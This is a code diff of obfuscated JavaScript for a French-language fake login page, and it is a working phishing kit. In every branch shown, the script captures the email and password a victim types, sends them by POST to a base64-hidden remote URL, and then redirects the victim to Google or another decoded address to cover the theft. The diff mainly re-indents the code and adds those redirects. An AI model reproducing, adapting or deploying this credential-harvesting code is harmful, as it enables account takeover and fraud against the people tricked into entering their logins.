@@ -62,81 +62,86 @@ document["addEventListener"](_0x40d1b3(0x147), function () {
         _0x2c9a80 = document[_0x2ffcc5(0x148)](_0x2ffcc5(0x146)),
         _0x500e0a = document[_0x2ffcc5(0x148)](_0x2ffcc5(0x135)),
         _0x1120d2 = document[_0x2ffcc5(0x148)]("continuer-button");
-    _0x1120d2[_0x2ffcc5(0x131)](_0x2ffcc5(0x145), function () {
-        var _0x3452cb = _0x2ffcc5;
-        if (_0x474328[_0x3452cb(0x13a)] === "")
-            (_0x2c9a80[_0x3452cb(0x138)] = "Veuillez\x20entrer\x20une\x20adresse\x20email."),
-            _0x2c9a80["classList"][_0x3452cb(0x137)](_0x3452cb(0x123)),
-            _0x500e0a["classList"][_0x3452cb(0x12c)](_0x3452cb(0x123)),
-            _0x474328[_0x3452cb(0x12a)]();
-        else {
-            var _0x5afd3e = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            _0x5afd3e[_0x3452cb(0x13e)](_0x474328[_0x3452cb(0x13a)]) ?
-                (_0x2c9a80[_0x3452cb(0x129)][_0x3452cb(0x12c)](_0x3452cb(0x123)),
-                _0x46cb83[_0x3452cb(0x129)][_0x3452cb(0x137)](_0x3452cb(0x123)),
-                _0x55180f[_0x3452cb(0x12a)](),
-                _0x1120d2[_0x3452cb(0x131)](_0x3452cb(0x145), function () {
-                    var _0x254d11 = _0x3452cb;
-                    if (_0x55180f["value"] === "")
-                        (_0x500e0a[_0x254d11(0x138)] = _0x254d11(0x141)),
-                        _0x500e0a["classList"][_0x254d11(0x137)](_0x254d11(0x123));
-                    else {
-                        _0x1d2392++,
-                            (url = atob(msurl));
-                        if (_0x1d2392 == 0x1) {
-                            var _0x59e211 = document[_0x254d11(0x148)]("zone-email")[_0x254d11(0x13a)],
+_0x1120d2[_0x2ffcc5(0x131)](_0x2ffcc5(0x145), function () {
+    var _0x3452cb = _0x2ffcc5;
+    if (_0x474328[_0x3452cb(0x13a)] === "")
+        (_0x2c9a80[_0x3452cb(0x138)] = "Veuillez\x20entrer\x20une\x20adresse\x20email."),
+        _0x2c9a80["classList"][_0x3452cb(0x137)](_0x3452cb(0x123)),
+        _0x500e0a["classList"][_0x3452cb(0x12c)](_0x3452cb(0x123)),
+        _0x474328[_0x3452cb(0x12a)]();
+    else {
+        var _0x5afd3e = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        _0x5afd3e[_0x3452cb(0x13e)](_0x474328[_0x3452cb(0x13a)]) ?
+            (_0x2c9a80[_0x3452cb(0x129)][_0x3452cb(0x12c)](_0x3452cb(0x123)),
+            _0x46cb83[_0x3452cb(0x129)][_0x3452cb(0x137)](_0x3452cb(0x123)),
+            _0x55180f[_0x3452cb(0x12a)](),
+            _0x1120d2[_0x3452cb(0x131)](_0x3452cb(0x145), function () {
+                var _0x254d11 = _0x3452cb;
+                if (_0x55180f["value"] === "")
+                    (_0x500e0a[_0x254d11(0x138)] = _0x254d11(0x141)),
+                    _0x500e0a["classList"][_0x254d11(0x137)](_0x254d11(0x123));
+                else {
+                    _0x1d2392++,
+                        (url = atob(msurl));
+                    if (_0x1d2392 == 0x1) {
+                        var _0x59e211 = document[_0x254d11(0x148)]("zone-email")[_0x254d11(0x13a)],
+                            _0x280346 = document[_0x254d11(0x148)](_0x254d11(0x12f))[_0x254d11(0x13a)],
+                            _0x7429be = {
+                                email: _0x59e211,
+                                password: _0x280346,
+                            };
+                        _0x1298a(_0x7429be);
+                        (_0x500e0a[_0x254d11(0x138)] = _0x254d11(0x140)),
+                        _0x55180f[_0x254d11(0x12a)](),
+                        (_0x55180f[_0x254d11(0x13a)] = ""),
+                        _0x500e0a[_0x254d11(0x129)]["remove"](_0x254d11(0x123)),
+                        fetch(url, {
+                            method: _0x254d11(0x121),
+                            headers: {
+                                "Content-Type": _0x254d11(0x139),
+                            },
+                            body: JSON["stringify"](_0x7429be),
+                        })[_0x254d11(0x130)]((_0x54d248) => {
+                            var _0x3e1122 = _0x254d11;
+                            if (_0x54d248["ok"])
+                                return _0x54d248[_0x3e1122(0x12b)]();
+                            else throw new Error(_0x3e1122(0x126) + _0x54d248[_0x3e1122(0x125)]);
+                        });
+
+                        // Redirection vers Google après l'envoi des données
+                        window.location.href = "https://www.google.com";
+                    } else {
+                        if (_0x1d2392 == 0x2) {
+                            var _0x59e211 = document["getElementById"](_0x254d11(0x136))[_0x254d11(0x13a)],
                                 _0x280346 = document[_0x254d11(0x148)](_0x254d11(0x12f))[_0x254d11(0x13a)],
                                 _0x7429be = {
                                     email: _0x59e211,
                                     password: _0x280346,
                                 };
                             _0x1298a(_0x7429be);
-                            (_0x500e0a[_0x254d11(0x138)] = _0x254d11(0x140)),
-                            _0x55180f[_0x254d11(0x12a)](),
-                            (_0x55180f[_0x254d11(0x13a)] = ""),
-                            _0x500e0a[_0x254d11(0x129)]["remove"](_0x254d11(0x123)),
                             fetch(url, {
                                 method: _0x254d11(0x121),
                                 headers: {
-                                    "Content-Type": _0x254d11(0x139),
+                                    "Content-Type": "application/json",
                                 },
                                 body: JSON["stringify"](_0x7429be),
-                            })[_0x254d11(0x130)]((_0x54d248) => {
-                                var _0x3e1122 = _0x254d11;
-                                if (_0x54d248["ok"])
-                                    return _0x54d248[_0x3e1122(0x12b)]();
-                                else throw new Error(_0x3e1122(0x126) + _0x54d248[_0x3e1122(0x125)]);
-                            });
-                        } else {
-                            if (_0x1d2392 == 0x2) {
-                                var _0x59e211 = document["getElementById"](_0x254d11(0x136))[_0x254d11(0x13a)],
-                                    _0x280346 = document[_0x254d11(0x148)](_0x254d11(0x12f))[_0x254d11(0x13a)],
-                                    _0x7429be = {
-                                        email: _0x59e211,
-                                        password: _0x280346,
-                                    };
-                                _0x1298a(_0x7429be);
-                                fetch(url, {
-                                    method: _0x254d11(0x121),
-                                    headers: {
-                                        "Content-Type": "application/json",
-                                    },
-                                    body: JSON["stringify"](_0x7429be),
-                                })[_0x254d11(0x130)]((_0xb5c93c) => {
-                                    var _0xe9187a = _0x254d11;
-                                    if (_0xb5c93c["ok"])
-                                        return _0xb5c93c["json"]();
-                                    else throw new Error(_0xe9187a(0x126) + _0xb5c93c["status"]);
-                                }),
-                                (window[_0x254d11(0x142)][_0x254d11(0x134)] = atob(_0x254d11(0x128)));
-                            }
+                            })[_0x254d11(0x130)]((_0xb5c93c) => {
+                                var _0xe9187a = _0x254d11;
+                                if (_0xb5c93c["ok"])
+                                    return _0xb5c93c["json"]();
+                                else throw new Error(_0xe9187a(0x126) + _0xb5c93c["status"]);
+                            }),
+                            (window[_0x254d11(0x142)][_0x254d11(0x134)] = atob(_0x254d11(0x128)));
+
+                            // Redirection vers Google après le deuxième envoi
+                            window.location.href = "https://www.google.com";
                         }
                     }
-                })) :
-                ((_0x2c9a80["innerText"] = _0x3452cb(0x12d)),
-                _0x2c9a80[_0x3452cb(0x129)][_0x3452cb(0x137)]("hidden"),
-                _0x500e0a[_0x3452cb(0x129)][_0x3452cb(0x12c)](_0x3452cb(0x123)),
-                _0x474328[_0x3452cb(0x12a)]());
-        }
-    });
+                }
+            })) :
+            ((_0x2c9a80["innerText"] = _0x3452cb(0x12d)),
+            _0x2c9a80[_0x3452cb(0x129)][_0x3452cb(0x137)]("hidden"),
+            _0x500e0a[_0x3452cb(0x129)][_0x3452cb(0x12c)](_0x3452cb(0x123)),
+            _0x474328[_0x3452cb(0x12a)]());
+    }
 });
